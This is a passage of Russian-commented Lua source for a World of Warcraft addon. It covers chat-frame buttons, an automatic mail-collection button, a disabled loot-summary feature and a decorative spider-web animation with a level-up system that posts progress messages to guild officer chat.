                    local currentFrame = GetCurrentChatFrame()
                    if currentFrame and currentFrame.editBox then
                        currentFrame.editBox:SetText("/g ")
                        currentFrame.editBox:SetFocus()
                        currentFrame.editBox:HighlightText()
                        SetTextColor("guild")
                    end
                end
            end
        end
    end)
    
    eventFrame:RegisterEvent("FRIENDLIST_UPDATE")
    eventFrame:RegisterEvent("PLAYER_ENTERING_WORLD")
    
    -- Функция обновления цвета для вызова извне
    socialBtn.UpdateColor = function()
        SetTextColor(lastChatType)
    end
    
    -- Инициализация
    socialBtn:Show()
    UpdateSocialCount()
    
    -- Сохраняем ссылки
    frame.socialButton = socialBtn
    frame.menuButton = button
    frame.scrollButton = downBtn
    frame.settingsButton = settingsBtn
    frame.settingsPanel = settingsPanel
end

-- Создаём кнопки для всех чат-фреймов
for i = 1, NUM_CHAT_WINDOWS do
    local frame = _G["ChatFrame" .. i]
    if frame then 
        CreateChatMenuButton(frame)
    end
end







-- -- Таблицы для хранения итогов
-- local lootSummary = {
--     moneyStrings = {},
--     items = {}  -- [название] = {count, link}
-- }

-- -- Функция очистки сообщения от escape-последовательностей
-- local function CleanMessage(msg)
--     msg = string.gsub(msg, "|4([^:]+):[^:]+:[^;]+;", "%1")
--     msg = string.gsub(msg, "|", "")
--     msg = string.gsub(msg, "%s+", " ")
--     msg = string.gsub(msg, "^%s+", "")
--     msg = string.gsub(msg, "%s+$", "")
--     return msg
-- end

-- -- Функция извлечения названия и ссылки предмета
-- local function ExtractItemInfo(msg)
--     -- Ищем ссылку предмета: |cff......|h[Название]|h|r или просто [Название]
--     local link = string.match(msg, "(|c%x+|Hitem:%d+.-|h.-|h|r)")
--     local name = string.match(msg, "%[(.-)%]")
--     return name, link
-- end

-- -- Функция формирования чистого сообщения для гильдчата
-- local function FormatForGuild(event, msg)
--     if event == "CHAT_MSG_MONEY" then
--         return CleanMessage(msg)
--     elseif event == "CHAT_MSG_LOOT" then
--         local name, link = ExtractItemInfo(msg)
--         if name then
--             if link then
--                 return "Ваша добыча: " .. link
--             else
--                 return "Ваша добыча: [" .. name .. "]."
--             end
--         end
--     end
--     return nil
-- end

-- -- Нормализация денег
-- local function NormalizeMoney(gold, silver, copper)
--     if copper >= 100 then
--         silver = silver + math.floor(copper / 100)
--         copper = copper % 100
--     end
--     if silver >= 100 then
--         gold = gold + math.floor(silver / 100)
--         silver = silver % 100
--     end
--     return gold, silver, copper
-- end

-- -- Функция вывода итогов в гильдчат
-- local function PrintSummary()
--     -- Суммируем все сохранённые деньги
--     local totalGold, totalSilver, totalCopper = 0, 0, 0
    
--     for _, moneyStr in ipairs(lootSummary.moneyStrings) do
--         local g = tonumber(string.match(moneyStr, "(%d+) золот"))
--         local s = tonumber(string.match(moneyStr, "(%d+) серебр"))
--         local c = tonumber(string.match(moneyStr, "(%d+) мед"))
--         totalGold = totalGold + (g or 0)
--         totalSilver = totalSilver + (s or 0)
--         totalCopper = totalCopper + (c or 0)
--     end
    
--     local g, s, c = NormalizeMoney(totalGold, totalSilver, totalCopper)
    
--     local moneyStr = ""
--     if g > 0 or s > 0 or c > 0 then
--         local parts = {}
--         if g > 0 then table.insert(parts, g .. " золотых") end
--         if s > 0 then table.insert(parts, s .. " серебряных") end
--         if c > 0 then table.insert(parts, c .. " медных") end
--         moneyStr = table.concat(parts, ", ")
--     end
    
--     if moneyStr == "" and not next(lootSummary.items) then
--         SendChatMessage("Добычи пока нет.", "GUILD")
--         return
--     end
    
--     SendChatMessage("=== ИТОГИ ДОБЫЧИ ===", "GUILD")
    
--     if moneyStr ~= "" then
--         SendChatMessage("Деньги: " .. moneyStr, "GUILD")
--     end
    
--     if next(lootSummary.items) then
--         SendChatMessage("Предметы:", "GUILD")
--         for itemName, itemData in pairs(lootSummary.items) do
--             local link = itemData.link or "[" .. itemName .. "]"
--             SendChatMessage("  " .. link .. " x" .. itemData.count, "GUILD")
--         end
--     end
    
--     SendChatMessage("====================", "GUILD")
    
--     -- Сбрасываем
--     lootSummary.moneyStrings = {}
--     lootSummary.items = {}
-- end

-- -- Фрейм для отслеживания добычи И гильдчата
-- local f = CreateFrame("Frame")
-- f:RegisterEvent("CHAT_MSG_MONEY")
-- f:RegisterEvent("CHAT_MSG_LOOT")
-- f:RegisterEvent("CHAT_MSG_GUILD")

-- f:SetScript("OnEvent", function(self, event, msg, ...)
--     if event == "CHAT_MSG_GUILD" then
--         if msg == "-итоги" or string.find(msg, "^%-итоги") then
--             PrintSummary()
--         end
--     elseif event == "CHAT_MSG_MONEY" or event == "CHAT_MSG_LOOT" then
--         -- Формируем чистое сообщение
--         local guildMsg = FormatForGuild(event, msg)
        
--         if guildMsg then
--             -- Сохраняем для итогов
--             if event == "CHAT_MSG_MONEY" then
--                 table.insert(lootSummary.moneyStrings, guildMsg)
--             elseif event == "CHAT_MSG_LOOT" then
--                 local name, link = ExtractItemInfo(msg)
--                 if name then
--                     if not lootSummary.items[name] then
--                         lootSummary.items[name] = { count = 0, link = link }
--                     end
--                     lootSummary.items[name].count = lootSummary.items[name].count + 1
--                 end
--             end
            
--             -- Отправляем в гильдчат
--             SendChatMessage(guildMsg, "GUILD")
--         end
--     end
-- end)














----------------- СБОР ПОЧТЫ --------------
local btn = CreateFrame("Button", nil, UIParent, "UIPanelButtonTemplate")
btn:SetSize(128, 23)
btn:SetText("ЗАБРАТЬ ВСЕ")
btn:SetFrameStrata("HIGH")
btn:Hide()

local testQ = {}

btn:SetScript("OnClick", function(self, button)
    if testQ ~= nil then
        if testQ["mail"] == nil then
            testQ["mail"] = 1
        else
            testQ["mail"] = nil
        end
    end
    if testQ["mail"] == 1 then
        btn:SetText("..сбор..")
    else
        btn:SetText("ЗАБРАТЬ ВСЕ")
    end
end)

local f = CreateFrame("Frame")
f:RegisterEvent("MAIL_SHOW")
f:RegisterEvent("MAIL_CLOSED")
f:RegisterEvent("MAIL_INBOX_UPDATE")

f:SetScript("OnEvent", function()
    if MailFrame:IsVisible() and not SendMailFrame:IsVisible() then
        if not btn:IsVisible() then
            btn:ClearAllPoints()
            btn:SetPoint("TOPRIGHT", MailFrame, "TOPRIGHT", -55, -13)
            btn:Show()
        end
    else
        if btn:IsVisible() then
            btn:Hide()
            testQ["mail"] = nil
        end
        return
    end
    
    if InboxPrevPageButton:IsEnabled() ~= 0 then
        btn:Disable()
    else
        btn:Enable()
    end
    
    if testQ["mail"] == 1 then
        btn:SetText("..сбор..")
    else
        btn:SetText("ЗАБРАТЬ ВСЕ")
    end
end)

-- Сбор почты
local frameTime = CreateFrame("FRAME")
local timeElapsed = 0
frameTime:HookScript("OnUpdate", function(self, elapsed)
    if MailFrame:IsVisible() then
        timeElapsed = timeElapsed + elapsed
        if timeElapsed > 0.01 then
            timeElapsed = 0
            if testQ["mail"] ~= nil then
                local x = GetInboxNumItems()
                if x >= 1 then
                    local l1, l2, l3, l4, l5, l6 = GetInboxHeaderInfo(1)
                    if tonumber(l6) == 0 then
                        AutoLootMailItem(1)
                        MailItem1Button:Click()
                        OpenMailDeleteButton:Click()
                        StaticPopup1Button2:Click()
                    end
                else
                    testQ["mail"] = nil
                end
            end
        end
    end
end)
----------------КОНЕЦ СБОРА ПОЧТЫ-------------------














































































































































































local ADDON_FOLDER = ...
if type(ADDON_FOLDER) ~= "string" or ADDON_FOLDER == "" then
    ADDON_FOLDER = "NSPauk"
end

if type(NSPauk) ~= "table" then
    NSPauk = {}
end

if type(nsDbc) ~= "table" then
    nsDbc = {}
end

NSPauk.initialized = false
NSPauk.nextInstanceId = 1

local function copyPoint(p)
    if not p then
        return { x = 0, y = 0 }
    end
    return { x = p.x or 0, y = p.y or 0 }
end

function NSPauk:NP_MakeMothPounceTask(from, to)
    local p0 = {
        x = from.x or 0,
        y = from.y or 0,
    }

    local p2 = {
        x = to.x or 0,
        y = to.y or 0,
    }

    return {
        kind = "travel",
        nspMothPounce = true,
        nspNoSupportCheck = true,
        nspNoInsert = true,
        nspAllowTeleport = true,
        drop = false,
        p0 = p0,
        p1 = {
            x = (p0.x + p2.x) / 2,
            y = (p0.y + p2.y) / 2,
        },
        p2 = p2,
    }
end

function NSPauk:NP_TryMothPounce()
    local S = self.S
    local m = S.moth

    if not m or not m.active then
        return false
    end

    if m.frozen or m.pouncing then
        return false
    end

    if S.phase ~= "task" then
        return false
    end

    local info = self:GetMothStuckInfo()
    if info then
        m.x = info.x
        m.y = info.y
    end

    if type(m.x) ~= "number" or type(m.y) ~= "number" then
        return false
    end

    local task = S.currentTask
    if task and (task.nspMothPounce or task.nspMothFreeze) then
        return false
    end

    local cur = self:NP_GetSpiderPointIfShown()

    local x
    local y

    if cur then
        x = cur.x
        y = cur.y
    else
        x = S.lastSpiderX or m.x
        y = S.lastSpiderY or m.y
    end

    local dx = m.x - x
    local dy = m.y - y
    local dist = math.sqrt(dx * dx + dy * dy)

    local threshold = tonumber(m.pounceThreshold)
        or tonumber(self.C.MOTH_POUNCE_DIST)
        or 300

    if dist > threshold then
        return false
    end

    m.pouncing = true

    self:NP_ClearGlobalDrag(false)

    if task and task.nspDragTextures then
        self:RecycleTextures(task.nspDragTextures)
        task.nspDragTextures = nil
    end

    local pounce = self:NP_MakeMothPounceTask(
        { x = x, y = y },
        { x = m.x, y = m.y }
    )

    local freeze = self:NP_MakeMothFreezeTask({ x = m.x, y = m.y })

    local tasks = {
        pounce,
        freeze,
    }

    if type(m.wrapTasks) == "table" then
        for _, wrapTask in ipairs(m.wrapTasks) do
            tasks[#tasks + 1] = wrapTask
        end
    end

    S.tasks = tasks

    if m.inst then
        m.inst.tasks = tasks
    end

    S.taskIdx = 1
    S.currentTask = nil
    S.completeTimer = 0

    self:AdvanceTask()

    return true
end

NSPauk.DefaultConstants = {
    ADAPTIVE_ENABLED = 1,
    ADAPTIVE_FPS_MIN = 5,
    ADAPTIVE_STEP = 0.05,
    ADAPTIVE_CHECK = 1.0,
    ADAPTIVE_MAX_INTERVAL = 0.5,
    SPIDER_ANIM_INTERVAL = 0.18,
    DELAY_AFTER_LOGIN = 3,
    STILL_WAIT = 5,
    SPEED_CHECK = 1,
    SPEED_THRESHOLD = 2,
    WEB_SIZE = 2,
    WEB_ALPHA = 0.55,
    SPIDER_SIZE = 64,
    FAST_MODE = 0.085,
    MAX_WEB_SEGS = 120000,
    FADE_DURATION = 10,
    DISABLE_TIME = 3600,
    MIN_ANCHOR_SIZE = 14,
    MIN_INNER_SIZE = 6,
    MIN_WEB_GAP = 22,
    MIN_CROSS_LEN = 4,
    MAX_VISIBLE_RECTS = 300,
    TARGET_COUNT_MIN = 3,
    TARGET_COUNT_MAX = 6,
    MAX_INSTANCES = 6,
    CROSS_ROW_SPACING = 20,
    MAX_CROSS_ROWS = 1600,
    ARC_SAMPLES = 256,
    MAIN_SAG_MIN = 0.06,
    MAIN_SAG_MAX = 0.16,
    CROSS_SAG_MIN = 0.05,
    CROSS_SAG_MAX = 0.13,
    SPIDER_SPEED_MIN = 30,
    SPIDER_SPEED_MAX = 65,
    TRAVEL_SPEED_MULT = 6,
    CROSS_SPEED_MULT = 1.15,
    MAIN_SPEED_MULT = 2.0,
    EMPTY_SPEED_MULT = 4,
    MOTH_POUNCE_DIST = 300,
    WEB_POINT_SPACING_MAX = 1,
    MAX_DROPS_PER_FRAME = 140,
    DRAG_FPS_TARGET = 40,
    DRAG_FPS_RECOVER = 48,
    DRAG_FPS_SAMPLE = 0.4,
    DRAG_UPDATE_MIN = 0.016,
    DRAG_UPDATE_MAX = 0.25,
    COMPLETE_PAUSE = 2.5,
    MONITOR_CHECK = 0.35,
    MOVEMENT_TOLERANCE = 2.0,
    TEAR_FADE_DURATION = 2.5,
    COCOON_CHANCE = 0.18,
    COCOON_WRAPS_MIN = 5,
    COCOON_WRAPS_MAX = 9,
    COCOON_LOOP_SEGS = 8,
    COCOON_DIAG_MIN = 3,
    COCOON_DIAG_MAX = 6,
    COCOON_MIN_WIDTH = 30,
    COCOON_MIN_AREA = 2000,
    COCOON_MAX_AREA = 180000,
    DISSOLVE_DURATION_MIN = 180,
    DISSOLVE_DURATION_MAX = 180,
    MIN_COCOON_ALPHA = 0.03,
    MOUSE_CHECK = 0.15,
    MOUSE_THREAD_DIST = 5,
    MOUSE_HOVER_LIMIT = 5,
    MOUSE_STREAK_RESET = 4,
    POINTS_PER_LEVEL = 60000,
    SESSION_FULL_POINTS = 60000,
    SESSION_EXP_PERCENT_MAX = 1.0,
    COCOON_EXP_PERCENT = 0.05,
    LIMIT_COCOON_INTERVAL = 1800,
    LIMIT_COCOON_RETRY = 60,
    CROSS_MAX_SECTOR_ANGLE = 160,
    WEB_THREAD_MIN_SEPARATION = 20,
    WEB_HUB_IGNORE_DIST = 100,
    WEB_TARGET_REROLL_ATTEMPTS = 8,
    SURVIVAL_CHANCE = 0,
}

NSPauk.ConstantDescriptions = {

    SPIDER_SIZE = "Размер паука",
    WEB_SIZE = "Размер точек паутины",
    WEB_ALPHA = "Прозрачность паутины",
    WEB_POINT_SPACING_MAX = "Шаг точек паутины",
    MAIN_SAG_MIN = "Мин. провис основных нитей",
    MAIN_SAG_MAX = "Макс. провис основных нитей",
    CROSS_SAG_MIN = "Мин. провис перемычек",
    CROSS_SAG_MAX = "Макс. провис перемычек",

    TARGET_COUNT_MIN = "Мин. нитей в паутине",
    TARGET_COUNT_MAX = "Макс. нитей в паутине",
    MAX_INSTANCES = "Макс. одновременных паутин",
    CROSS_ROW_SPACING = "Шаг рядов перемычек",
    WEB_THREAD_MIN_SEPARATION = "Мин. расстояние между нитями",
    MIN_WEB_GAP = "Мин. длина нити",
    MIN_CROSS_LEN = "Мин. длина перемычки",
    MAX_CROSS_ROWS = "Макс. рядов перемычек",

    SPIDER_SPEED_MIN = "Мин. скорость паука",
    SPIDER_SPEED_MAX = "Макс. скорость паука",
    FAST_MODE = "Общий множитель скорости",
    TRAVEL_SPEED_MULT = "Множитель скорости переходов",
    CROSS_SPEED_MULT = "Множитель скорости на перемычках",
    MAIN_SPEED_MULT = "Множитель скорости на основных нитях",
    EMPTY_SPEED_MULT = "Множитель скорости пустых переходов",
    MOTH_POUNCE_DIST = "Дальность прыжка на мотылька",

    COCOON_CHANCE = "Шанс кокона вместо обычной паутины",
    DISSOLVE_DURATION_MIN = "Мин. время поедания кокона (сек)",
    DISSOLVE_DURATION_MAX = "Макс. время поедания кокона (сек)",
    COCOON_MIN_WIDTH = "Мин. ширина жертвы кокона",
    COCOON_MIN_AREA = "Мин. площадь жертвы кокона",
    COCOON_MAX_AREA = "Макс. площадь жертвы кокона",

    POINTS_PER_LEVEL = "Точек паутины на уровень",
    COCOON_EXP_PERCENT = "Доля уровня за кокон",
    SESSION_FULL_POINTS = "Точек для полного опыта сессии",
    SESSION_EXP_PERCENT_MAX = "Макс. доля опыта сессии",
    SURVIVAL_CHANCE = "Шанс выжить после тапка",
}

NSPauk.S = {
    phase = "init",
    initTimer = 0,
    speedTimer = 0,
    stillTimer = 0,
    completeTimer = 0,
    monitorTimer = 0,
    spider = nil,
    clickBtn = nil,
    instances = {},
    currentInstance = nil,
    tasks = {},
    taskIdx = 1,
    currentTask = nil,
    webPool = {},
    webCreated = 0,
    webPoints = 0,
    webAliveCount = 0,
    fades = {},
    disableTimer = 0,
    lastSpiderX = 0,
    lastSpiderY = 0,
    lastDropX = 0,
    lastDropY = 0,
    lastTaskT = 0,
    mouseTimer = 0,
    mouseOnThread = nil,
    mouseIdle = 0,
    cocoon = nil,
    digestedFrames = {},
    moveDur = 1,
    moveT = 0,
    SW = 1,
    SH = 1,
    activeFrame = nil,
    spiderFrame = nil,
    clickFrame = nil,
    mode = "base",
    session = {
        bestPoints = 0,
        bestExpAwarded = 0,
    },
    suppressSettle = false,
    limitReached = false,
    limitReturnPending = false,
    limitCocoonPending = false,
    limitWaitTimer = 0,
    limitHomePoint = nil,
}

NSPauk.SpiderTextureProfiles = {
    default = {
        label = "Анимация",
        textures = {
            "Interface\\AddOns\\NSQC3\\libs\\pauk1.tga",
            "Interface\\AddOns\\NSQC3\\libs\\pauk2.tga",
            "Interface\\AddOns\\NSQC3\\libs\\pauk3.tga",
            "Interface\\AddOns\\NSQC3\\libs\\pauk4.tga",
        },
    },
}

NSPauk.C = {}
NSPauk.DB = nil

function NSPauk:EnsureDB()
    if type(nsDbc) ~= "table" then
        nsDbc = {}
    end

    if type(nsDbc["паук"]) ~= "table" then
        nsDbc["паук"] = {}
    end

    local db = nsDbc["паук"]

    if type(db.constants) ~= "table" then
        db.constants = {}
    end

    for key, value in pairs(self.DefaultConstants) do
        local current = db.constants[key]
        if current == nil then
            db.constants[key] = value
        elseif type(value) == "number" and (type(current) ~= "number" or current ~= current) then
            db.constants[key] = value
        end
    end

    -- Страховка, если константа не была добавлена в DefaultConstants.
    if type(db.constants.SPIDER_ANIM_INTERVAL) ~= "number"
        or db.constants.SPIDER_ANIM_INTERVAL ~= db.constants.SPIDER_ANIM_INTERVAL
        or db.constants.SPIDER_ANIM_INTERVAL <= 0 then
        db.constants.SPIDER_ANIM_INTERVAL = 0.18
    end

    if type(db.progress) ~= "table" then
        db.progress = { totalPoints = 0 }
    end

    if type(db.progress.totalPoints) ~= "number" or db.progress.totalPoints ~= db.progress.totalPoints then
        db.progress.totalPoints = 0
    end

    if type(db.progress.history) ~= "table" then
        db.progress.history = {}
    end

    for i = #db.progress.history, 1, -1 do
        local entry = db.progress.history[i]
        if type(entry) == "table" and entry.key == "MIGRATED" and entry.migrated then
            table.remove(db.progress.history, i)
        end
    end

    db.progress.historyMigrated = nil

    if type(db.spiderProfile) ~= "string" or db.spiderProfile == "" then
        db.spiderProfile = "default"
    end

    if db.spiderProfile == "animated" then
        db.spiderProfile = "default"
    end

    if type(self.SpiderTextureProfiles) == "table"
        and not self.SpiderTextureProfiles[db.spiderProfile] then
        db.spiderProfile = "default"
    end

    if type(db.adaptive) ~= "table" then
        db.adaptive = {}
    end

    local adaptive = db.adaptive

    if type(adaptive.enabled) ~= "boolean" then
        if adaptive.enabled == 0 or adaptive.enabled == false then
            adaptive.enabled = false
        else
            adaptive.enabled = true
        end
    end

    if type(adaptive.level) ~= "number"
        or adaptive.level ~= adaptive.level
        or adaptive.level < 0 then
        adaptive.level = 0
    end

    adaptive.level = math.floor(adaptive.level + 0.5)

    if type(adaptive.interval) ~= "number"
        or adaptive.interval ~= adaptive.interval
        or adaptive.interval < 0 then
        adaptive.interval = 0
    end

    local maxInterval = self.DefaultConstants.ADAPTIVE_MAX_INTERVAL
    if type(maxInterval) ~= "number"
        or maxInterval ~= maxInterval
        or maxInterval <= 0 then
        maxInterval = 0.5
    end

    if adaptive.interval > maxInterval then
        adaptive.interval = maxInterval
    end

    self.DB = db

    return db
end

function NSPauk:ApplyRuntimeConstants()
    local C = self.C
    C.ADDON = "NSPauk"
    C.CLICK_SOUND = "Interface\\AddOns\\" .. ADDON_FOLDER .. "\\libs\\bzd.ogg"
    C.CLICK_TEX = "Interface\\AddOns\\" .. ADDON_FOLDER .. "\\libs\\pxxx.tga"
    C.TEX_SPIDER = "Interface\\AddOns\\" .. ADDON_FOLDER .. "\\libs\\pauk.tga"
    C.TEX_WEB = "Interface\\AddOns\\" .. ADDON_FOLDER .. "\\libs\\pautina8.tga"
    C.LEVELUP_SOUND = "Interface\\AddOns\\NSQC3\\libs\\lvlUp.ogg"
    C.EXCLUDE_FRAMES = {
        MinimapCluster = true,
    }
    C.EXCLUDE_FRAMES[C.ADDON .. "_WebHigh"] = true
    C.EXCLUDE_FRAMES[C.ADDON .. "_SpiderHigh"] = true
    C.EXCLUDE_FRAMES[C.ADDON .. "_ClickHigh"] = true

    C.EXCLUDE_FRAMES[C.ADDON .. "_MothFrame"] = true
    C.EXCLUDE_FRAMES["NSPauk_MothFrame"] = true
    C.EXCLUDE_FRAMES["NSPauk_Moth"] = true
    C.EXCLUDE_FRAMES["NSPauk_MothWebHigh"] = true
    C.EXCLUDE_FRAMES["NSPauk_MothSpiderHigh"] = true
    C.EXCLUDE_FRAMES["NSPauk_MothClickHigh"] = true

    local function num(value, default)
        if type(value) ~= "number" or value ~= value then
            return default
        end
        return value
    end
    C.LIMIT_COCOON_INTERVAL = num(C.LIMIT_COCOON_INTERVAL, 1800)
    if C.LIMIT_COCOON_INTERVAL <= 0 then
        C.LIMIT_COCOON_INTERVAL = 1800
    end
    C.LIMIT_COCOON_RETRY = num(C.LIMIT_COCOON_RETRY, 60)
    if C.LIMIT_COCOON_RETRY <= 0 then
        C.LIMIT_COCOON_RETRY = 60
    end
    C.MAX_WEB_SEGS = math.floor(num(C.MAX_WEB_SEGS, self.DefaultConstants.MAX_WEB_SEGS) + 0.5)
    if C.MAX_WEB_SEGS < 0 then
        C.MAX_WEB_SEGS = self.DefaultConstants.MAX_WEB_SEGS
    end
    C.WEB_POINT_SPACING_MAX = num(C.WEB_POINT_SPACING_MAX, self.DefaultConstants.WEB_POINT_SPACING_MAX)
    if C.WEB_POINT_SPACING_MAX <= 0 then
        C.WEB_POINT_SPACING_MAX = self.DefaultConstants.WEB_POINT_SPACING_MAX
    end
    C.EMPTY_SPEED_MULT = num(C.EMPTY_SPEED_MULT, 4)
    if C.EMPTY_SPEED_MULT <= 0 then
        C.EMPTY_SPEED_MULT = 4
    end
    C.WEB_ALPHA = num(C.WEB_ALPHA, self.DefaultConstants.WEB_ALPHA)
    if C.WEB_ALPHA < 0 then
        C.WEB_ALPHA = 0
    elseif C.WEB_ALPHA > 1 then
        C.WEB_ALPHA = 1
    end
    C.WEB_SIZE = num(C.WEB_SIZE, self.DefaultConstants.WEB_SIZE)
    if C.WEB_SIZE < 1 then
        C.WEB_SIZE = self.DefaultConstants.WEB_SIZE
    end
    C.MAX_DROPS_PER_FRAME = math.floor(num(C.MAX_DROPS_PER_FRAME, self.DefaultConstants.MAX_DROPS_PER_FRAME) + 0.5)
    if C.MAX_DROPS_PER_FRAME < 0 then
        C.MAX_DROPS_PER_FRAME = self.DefaultConstants.MAX_DROPS_PER_FRAME
    end
    C.DRAG_FPS_TARGET = num(C.DRAG_FPS_TARGET, 40)
    if C.DRAG_FPS_TARGET < 5 then
        C.DRAG_FPS_TARGET = 40
    end
    C.DRAG_FPS_RECOVER = num(C.DRAG_FPS_RECOVER, 48)
    if C.DRAG_FPS_RECOVER < C.DRAG_FPS_TARGET then
        C.DRAG_FPS_RECOVER = C.DRAG_FPS_TARGET + 8
    end
    C.DRAG_FPS_SAMPLE = num(C.DRAG_FPS_SAMPLE, 0.4)
    if C.DRAG_FPS_SAMPLE < 0.1 then
        C.DRAG_FPS_SAMPLE = 0.4
    end
    C.DRAG_UPDATE_MIN = num(C.DRAG_UPDATE_MIN, 0.016)
    if C.DRAG_UPDATE_MIN < 0.005 then
        C.DRAG_UPDATE_MIN = 0.016
    end
    C.DRAG_UPDATE_MAX = num(C.DRAG_UPDATE_MAX, 0.25)
    if C.DRAG_UPDATE_MAX < C.DRAG_UPDATE_MIN then
        C.DRAG_UPDATE_MAX = math.max(0.25, C.DRAG_UPDATE_MIN * 4)
    end
    C.ADAPTIVE_ENABLED = math.floor(num(C.ADAPTIVE_ENABLED, 1) + 0.5)
    if C.ADAPTIVE_ENABLED ~= 0 then
        C.ADAPTIVE_ENABLED = 1
    end
    C.ADAPTIVE_FPS_MIN = num(C.ADAPTIVE_FPS_MIN, 29)
    if C.ADAPTIVE_FPS_MIN < 5 then
        C.ADAPTIVE_FPS_MIN = 29
    end
    C.ADAPTIVE_STEP = num(C.ADAPTIVE_STEP, 0.05)
    if C.ADAPTIVE_STEP <= 0 then
        C.ADAPTIVE_STEP = 0.05
    end
    C.ADAPTIVE_CHECK = num(C.ADAPTIVE_CHECK, 1.0)
    if C.ADAPTIVE_CHECK < 0.25 then
        C.ADAPTIVE_CHECK = 1.0
    end
    C.ADAPTIVE_MAX_INTERVAL = num(C.ADAPTIVE_MAX_INTERVAL, 0.5)
    if C.ADAPTIVE_MAX_INTERVAL < 0.05 then
        C.ADAPTIVE_MAX_INTERVAL = 0.5
    end
    if C.ADAPTIVE_MAX_INTERVAL < C.ADAPTIVE_STEP then
        C.ADAPTIVE_MAX_INTERVAL = C.ADAPTIVE_STEP
    end
    C.CROSS_MAX_SECTOR_ANGLE = num(C.CROSS_MAX_SECTOR_ANGLE, 160)
    C.WEB_THREAD_MIN_SEPARATION = num(C.WEB_THREAD_MIN_SEPARATION, 20)
    C.WEB_HUB_IGNORE_DIST = num(C.WEB_HUB_IGNORE_DIST, 100)
    C.WEB_TARGET_REROLL_ATTEMPTS = math.floor(num(C.WEB_TARGET_REROLL_ATTEMPTS, 8) + 0.5)
    C.COCOON_MIN_WIDTH = num(C.COCOON_MIN_WIDTH, 30)
    C.SPIDER_ANIM_INTERVAL = num(C.SPIDER_ANIM_INTERVAL, 0.18)
    if C.SPIDER_ANIM_INTERVAL < 0.05 then
        C.SPIDER_ANIM_INTERVAL = 0.05
    elseif C.SPIDER_ANIM_INTERVAL > 5 then
        C.SPIDER_ANIM_INTERVAL = 5
    end
end

function NSPauk:LoadConstants()
    local db = self:EnsureDB()
    self.DB = db
    self.C = db.constants
    self:ApplyRuntimeConstants()
end

function NSPauk:ResetConstants()
    local db = self:EnsureDB()
    self.DB = db

    local constants = db.constants
    for key in pairs(constants) do
        constants[key] = nil
    end

    for key, value in pairs(self.DefaultConstants) do
        constants[key] = value
    end

    self.C = constants
    self:ApplyRuntimeConstants()
end

function NSPauk:ResetSessionRecord()
    self.S.session = {
        bestPoints = 0,
        bestExpAwarded = 0,
        pendingBestPoints = nil,
        sessionReportScheduled = false,
    }

    self.S.sessionBurstPoints = 0
end

function NSPauk:ResetProgress()
    local db = self:EnsureDB()
    self.DB = db

    db.progress.totalPoints = 0
    db.progress.history = {}
    self.S.webPoints = 0

    self:ResetSessionRecord()
end

function NSPauk:PlayerHasGuild()
    if IsInGuild and IsInGuild() then
        return true
    end

    if GetGuildInfo then
        local guildName = GetGuildInfo("player")
        if guildName and guildName ~= "" then
            return true
        end
    end

    return false
end

function NSPauk:SendOfficer(text)
    if self:PlayerHasGuild() and SendChatMessage then
        if type(pcall) == "function" then
            pcall(SendChatMessage, text, "OFFICER")
        else
            SendChatMessage(text, "OFFICER")
        end
    end
end

function NSPauk:AddExperience(amount)
    if type(amount) ~= "number" or amount ~= amount or amount <= 0 then
        return 0, 0, 0, 0
    end

    local db = self:EnsureDB()
    local progress = db.progress

    local perLevel = self.C.POINTS_PER_LEVEL or 60000
    if type(perLevel) ~= "number" or perLevel ~= perLevel or perLevel <= 0 then
        perLevel = 60000
    end

    amount = math.floor(amount + 0.5)
    if amount <= 0 then
        return 0, 0, 0, 0
    end

    local oldTotal = progress.totalPoints or 0
    local oldLevel = math.floor(oldTotal / perLevel)

    local newTotal = oldTotal + amount
    progress.totalPoints = newTotal

    local newLevel = math.floor(newTotal / perLevel)
    local left = perLevel - (newTotal % perLevel)
    local levelsGained = newLevel - oldLevel

    if levelsGained > 0 then
        if PlaySoundFile then
            PlaySoundFile(self.C.LEVELUP_SOUND or "Interface\\AddOns\\NSQC3\\libs\\lvlUp.ogg")
        end
        self:ShowLevelUpFrame()
    end

    return amount, newLevel, left, levelsGained
end

function NSPauk:AwardCocoonExperience(targetName)
    local C = self.C

    local perLevel = C.POINTS_PER_LEVEL or 60000
    if type(perLevel) ~= "number" or perLevel ~= perLevel or perLevel <= 0 then
        perLevel = 60000
    end

    local pct = C.COCOON_EXP_PERCENT
    if type(pct) ~= "number" or pct ~= pct or pct < 0 then
        pct = 0.05
    end
    if pct > 1 then
        pct = 1
    end

    local amount = math.floor(perLevel * pct + 0.5)
    if amount <= 0 then
        return
    end

    local _, level, left = self:AddExperience(amount)

    if type(targetName) == "string" and targetName ~= "" then
        self:SendOfficer(string.format(
            "Мой павук свил кокон и съел %s! Единоразово получено %d опыта (%.1f%% уровня). Уровень %d, до уровня %d",
            targetName,
            amount,
            pct * 100,
            level,
            left
        ))
    else
        self:SendOfficer(string.format(
            "Мой павук свил кокон и съел объект! Единоразово получено %d опыта (%.1f%% уровня). Уровень %d, до уровня %d",
            amount,
            pct * 100,
            level,
            left
        ))
    end
end

function NSPauk:CalcWebExperience(count)
    if type(count) ~= "number" or count ~= count or count <= 0 then
        return 0, 0, 0
    end

    count = math.floor(count + 0.5)
    if count <= 0 then
        return 0, 0, 0
    end

    local C = self.C or {}

    local full = C.SESSION_FULL_POINTS
    if type(full) ~= "number" or full ~= full or full <= 0 then
        full = C.POINTS_PER_LEVEL or 60000
    end
    if type(full) ~= "number" or full ~= full or full <= 0 then
        full = 60000
    end

    local maxPct = C.SESSION_EXP_PERCENT_MAX
    if type(maxPct) ~= "number" or maxPct ~= maxPct or maxPct < 0 then
        maxPct = 1
    end
    if maxPct > 1 then
        maxPct = 1
    end

    local pct = count / full
    if pct > maxPct then
        pct = maxPct
    end
    if pct < 0 then
        pct = 0
    end

    local expGain = math.floor(count * pct + 0.5)
    if expGain < 0 then
        expGain = 0
    end

    return expGain, pct, count
end

function NSPauk:ShowProgress()
    local S = self.S
    local C = self.C
    local db = self:EnsureDB()
    local progress = db.progress
    local perLevel = C.POINTS_PER_LEVEL or 60000

    if type(perLevel) ~= "number" or perLevel ~= perLevel or perLevel <= 0 then
        perLevel = 60000
    end

    local total = progress.totalPoints or 0
    local level = math.floor(total / perLevel)
    local left = perLevel - (total % perLevel)

    if left == perLevel then
        left = 0
    end

    local currentThreads = 0
    if S.currentInstance and type(S.currentInstance.conns) == "table" then
        currentThreads = #S.currentInstance.conns
    end

    local session = S.session or { bestPoints = 0, bestExpAwarded = 0 }

    -- 1. Уровень и прогресс
    self:SendOfficer(string.format(
        "Павук: уровень %d, всего милиметров %d, до уровня %d",
        level,
        total,
        left
    ))

    -- 2. Краткая текущая статистика
